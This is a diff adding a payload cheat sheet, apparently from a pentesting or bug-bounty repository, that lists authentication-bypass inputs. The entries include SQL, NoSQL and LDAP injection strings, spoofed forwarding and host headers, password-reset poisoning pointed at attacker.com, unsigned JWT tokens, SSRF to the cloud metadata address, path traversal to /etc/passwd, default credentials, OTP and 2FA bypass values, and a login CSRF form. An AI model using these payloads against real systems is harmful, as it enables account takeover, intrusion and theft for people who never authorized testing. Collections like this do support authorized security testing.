@@ -1,0 +1,504 @@
+# Authentication Bypass Payloads
+
+# SQL injection authentication bypass
+admin' --
+admin' #
+admin'/*
+' OR '1'='1' --
+' OR 1=1--
+admin' OR '1'='1
+') OR ('1'='1
+' OR 'x'='x
+admin') OR ('1'='1'--
+
+# NoSQL authentication bypass
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$in": ["admin", "administrator"]}, "password": {"$gt": ""}}
+
+# JSON payload manipulation
+{"username":"admin","password":"admin","role":"admin"}
+{"username":"admin","password":"wrong","isAdmin":true}
+{"username":"admin","is_authenticated":true}
+
+# Session manipulation
+PHPSESSID=admin
+session_id=00000000-0000-0000-0000-000000000001
+token=admin_token
+auth=true
+
+# Parameter pollution
+username=attacker&username=admin
+user=normal&user=admin
+
+# Cookie manipulation
+admin=true
+isAdmin=1
+role=admin
+authenticated=true
+user_level=admin
+
+# Header injection
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Originating-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Host: localhost
+X-Forwarded-Host: localhost
+
+# URL path manipulation
+/admin/..;/
+/admin/%2e%2e%3b/
+/./admin/./
+/admin;/
+/admin..
+//admin//
+/./admin/./panel
+/%2e/admin
+/admin/~
+/admin#
+/admin?
+
+# HTTP verb tampering
+GET /admin
+POST /admin
+HEAD /admin
+PUT /admin
+DELETE /admin
+OPTIONS /admin
+TRACE /admin
+PATCH /admin
+
+# Case manipulation
+/Admin
+/ADMIN
+/AdMiN
+/aDmIn
+
+# Unicode bypass
+/admin%c0%af
+/admin%e0%80%af
+/admin%c0%ae%c0%ae/
+/%61dmin
+
+# Double encoding
+/%252e%252e%252fadmin
+/%252e%252e/admin
+
+# Null byte injection
+/admin%00
+/admin%00.html
+/admin%00.jpg
+
+# Credential stuffing patterns
+admin:admin
+administrator:administrator
+root:root
+admin:password
+admin:123456
+admin:admin123
+test:test
+guest:guest
+user:user
+demo:demo
+
+# Default credentials bypass
+username=admin&password=
+username=&password=
+username=admin&password=%20
+username=admin&password=*
+
+# Password reset bypass
+email=victim@example.com&email=attacker@example.com
+token=&email=attacker@example.com
+token=0
+token=null
+token=false
+token=undefined
+token=%20
+token=true
+email[]=victim@example.com&email[]=attacker@example.com
+email=victim@example.com%0Acc:attacker@example.com
+email=victim@example.com%0Abcc:attacker@example.com
+
+# Password reset token manipulation
+reset_token=' OR '1'='1
+reset_token={"$gt": ""}
+reset_token=*
+reset_token=admin'--
+user_id=1&token=valid_token
+user_id=999&token=valid_token
+
+# Host header injection for password reset poisoning
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+X-Host: attacker.com
+
+# Password reset without verification
+new_password=Pass123&confirm_password=Pass123
+# (without providing reset token or current password)
+
+# Password reset endpoint enumeration
+POST /api/password/reset
+POST /api/v1/auth/password-reset
+POST /password-reset
+POST /forgot-password
+POST /reset-password
+PUT /api/users/password
+PATCH /account/password
+
+# Weak token brute force
+token=000000
+token=111111
+token=123456
+token=0000
+token=1234
+
+# Bypass email verification in reset
+email_verified=true
+verified=true
+skip_verification=true
+
+# OTP/2FA bypass
+otp=000000
+otp=123456
+otp=111111
+otp=
+otp=%20
+otp=null
+
+# Response manipulation
+# Change HTTP response from 401/403 to 200
+# Change "authenticated": false to "authenticated": true
+# Change "role": "user" to "role": "admin"
+
+# JWT manipulation (see JWT-Vulnerabilities for more)
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+Authorization: Bearer null
+Authorization: Bearer 
+Authorization: 
+
+# GraphQL authentication bypass
+{"query":"mutation{login(username:\"admin\",password:\"' OR '1'='1\"){token}}"}
+{"query":"{users{id username password}}"}
+
+# XML authentication bypass
+<user><username>admin</username><password>' OR '1'='1</password></user>
+
+# LDAP authentication bypass
+username=*
+username=admin)(|(password=*
+username=*)(uid=*))(|(uid=*
+
+# OAuth/OIDC bypass
+redirect_uri=https://attacker.com
+state=
+nonce=
+code=
+
+# API key bypass
+api_key=
+X-API-Key: 
+Authorization: 
+apikey=null
+
+# Session fixation
+PHPSESSID=attacker_controlled_session
+jsessionid=12345
+
+# CAPTCHA bypass
+captcha=
+g-recaptcha-response=
+h-captcha-response=
+captcha_response=03AAYGu2...
+recaptcha=
+
+# Rate limiting bypass
+X-Forwarded-For: random_ip_each_request
+X-Originating-IP: random_ip_each_request
+X-Remote-IP: random_ip_each_request
+
+# Account enumeration
+username=admin&password=wrong
+username=nonexistent&password=wrong
+
+# Login form variations
+user[admin]=1
+user[role]=admin
+username[]=admin
+password[]=anything
+
+# Time-based bypass
+wait_for_rate_limit=true
+timestamp=future_date
+valid_until=9999999999
+
+# Magic hashes (PHP type juggling)
+# 0e215962017 == 0 (PHP)
+# 0e291242476940776845150308577824 == 0
+password=0e215962017
+password=240610708
+
+# Unicode normalization
+username=ⓐⓓⓜⓘⓝ
+username=𝒶𝒹𝓂𝒾𝓃
+username=ａｄｍｉｎ
+
+# Homograph attack
+username=αdmin (Greek alpha)
+username=аdmin (Cyrillic а)
+
+# Whitespace bypass
+username= admin
+username=admin 
+username=%20admin
+username=admin%20
+
+# Special characters
+username=admin'
+username=admin"
+username=admin`
+username=admin\
+
+# Email bypass for authentication
+email=admin@localhost
+email=admin@127.0.0.1
+email=@example.com
+email=victim@attacker.com
+
+# Host header authentication bypass
+Host: localhost
+Host: 127.0.0.1
+Host: internal.company.com
+
+# Referer bypass
+Referer: https://trusted-site.com
+Referer: https://localhost
+
+# Origin bypass
+Origin: https://trusted-site.com
+Origin: null
+
+# Authentication via GET instead of POST
+GET /api/login?username=admin&password=admin123
+
+# File inclusion for authentication bypass
+/etc/passwd
+../../../../../../etc/passwd
+
+# SSRF to bypass authentication
+url=http://localhost/admin
+url=http://127.0.0.1/admin
+url=http://169.254.169.254/latest/meta-data/
+
+# Request smuggling for authentication bypass
+Content-Length: 0
+Transfer-Encoding: chunked
+
+# Race conditions
+# Send multiple authentication requests simultaneously
+
+# Business logic bypass
+step=1&step=3
+status=pending&status=approved
+verified=false&verified=true
+
+# Broken authentication chain
+# Skip step 2 in multi-step authentication
+# Reuse old session tokens
+# Replay old authentication requests
+
+# ============================================
+# COMMON BUG BOUNTY FINDINGS
+# ============================================
+
+# JWT "none" algorithm bypass
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
+alg: none
+
+# JWT weak secret brute force
+# Try common secrets: secret, password, 123456, jwt, key
+
+# Account takeover via email change
+email=victim@example.com&new_email=attacker@example.com
+# Then reset password using attacker's email
+
+# Broken access control via UUID manipulation
+user_id=550e8400-e29b-41d4-a716-446655440000
+# Try sequential or predictable UUIDs
+
+# Authentication bypass via forced browsing
+/admin/dashboard
+/api/v1/admin/users
+/internal/admin
+/console
+/actuator
+/swagger-ui.html
+/debug
+
+# User enumeration via timing attacks
+username=existing_user (slower response)
+username=nonexistent (faster response)
+
+# Password policy bypass
+password=Pass123!@#$%^&*()_+{}[]|:;<>,.?/~`
+# Very long password that might bypass length checks
+password=AAAAA....(10000 chars)
+
+# Multi-account linking exploitation
+link_account=victim@example.com
+oauth_connect=victim_account_id
+
+# Session fixation via URL
+?PHPSESSID=attacker_session_id
+?session=attacker_controlled_value
+?token=known_token
+
+# Authentication via social login manipulation
+oauth_id=victim_oauth_id
+provider=google&user_id=victim_id
+
+# Register with existing email via race condition
+# Send 10 simultaneous registration requests with same email
+
+# Account takeover via referral code
+referral_code=victim_referral
+invite_code=admin_invite
+
+# Authentication bypass via API version manipulation
+/api/v1/login (with strict auth)
+/api/v0/login (might have weak auth)
+/api/beta/login
+/api/internal/login
+
+# Backup authentication endpoints
+/login.php.bak
+/auth.php~
+/login.php.old
+/authentication.php.backup
+
+# Default development credentials
+username=dev&password=dev
+username=developer&password=developer123
+username=staging&password=staging123
+username=debug&password=debug
+
+# Privilege escalation via user role manipulation
+role=user&role=admin
+user_type=regular&user_type=administrator
+is_privileged=false&is_privileged=true
+access_level=1&access_level=99
+
+# Account takeover via subdomain takeover
+# If auth uses subdomain cookies, takeover auth.example.com
+
+# Bypass via file upload to authentication directory
+# Upload .htaccess to disable authentication
+# Upload web shell to /admin/.htaccess
+
+# Authentication bypass via cache poisoning
+X-Forwarded-Host: attacker.com
+# Cache the response and serve to all users
+
+# Login CSRF to force login as attacker
+<form action="https://victim.com/login" method="POST">
+  <input name="username" value="attacker">
+  <input name="password" value="attacker_password">
+</form>
+
+# Insecure direct object reference in auth
+/auth/verify/USER_ID_1
+/auth/verify/USER_ID_2
+/auth/activate/TOKEN_1
+
+# Authentication via header injection
+Cookie: authenticated=true; admin=true
+Cookie: PHPSESSID=admin_session; role=administrator
+
+# Time-based authentication bypass
+# Set system time to future/past to bypass token expiration
+timestamp=9999999999
+valid_until=2099-01-01
+expires=253402300799
+
+# Biometric authentication bypass
+# Send empty biometric data
+fingerprint=
+face_id=null
+biometric_token=
+
+# MFA bypass via backup codes
+backup_code=000000
+recovery_code=111111
+emergency_code=123456
+
+# Authentication via registration endpoint abuse
+/register?username=admin&password=new_pass&force=true
+/signup?email=admin@example.com&override=true
+
+# Subdomain authentication inheritance
+# Login at login.example.com transfers to admin.example.com
+
+# Cross-site authentication via postMessage
+postMessage({type:'auth',token:'admin_token'}, '*')
+
+# Authentication bypass via request method override
+X-HTTP-Method-Override: GET
+X-Method-Override: GET
+# Change POST to GET to bypass CSRF and auth checks
+
+# ============================================
+# 403 BYPASS HEADERS
+# ============================================
+
+# IP spoofing / access control bypass headers
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded-Scheme: https
+X-Forwarded-Scheme: http
+X-Forwarded-Port: 80
+X-Forwarded-Port: 443
+X-Forwarded-Port: 8080
+X-Forwarded-Port: 8443
+X-Client-IP: 127.0.0.1
+X-Real-Ip: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-True-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+Client-IP: 127.0.0.1
+Real-Ip: 127.0.0.1
+
+# URL / host override headers
+X-Original-Url: 127.0.0.1
+X-Rewrite-Url: 127.0.0.1
+X-Http-Host-Override: 127.0.0.1
+X-Http-Destinationurl: 127.0.0.1
+X-Host: 127.0.0.1
+X-Proxy-Url: 127.0.0.1
+Proxy-Url: 127.0.0.1
+Proxy-Host: 127.0.0.1
+Http-Url: 127.0.0.1
+Base-Url: 127.0.0.1
+Url: 127.0.0.1
+Uri: 127.0.0.1
+Request-Uri: 127.0.0.1
+Redirect: 127.0.0.1
+
+# Referer / referrer spoofing
+Referer: 127.0.0.1
+Referrer: 127.0.0.1
+Refferer: 127.0.0.1
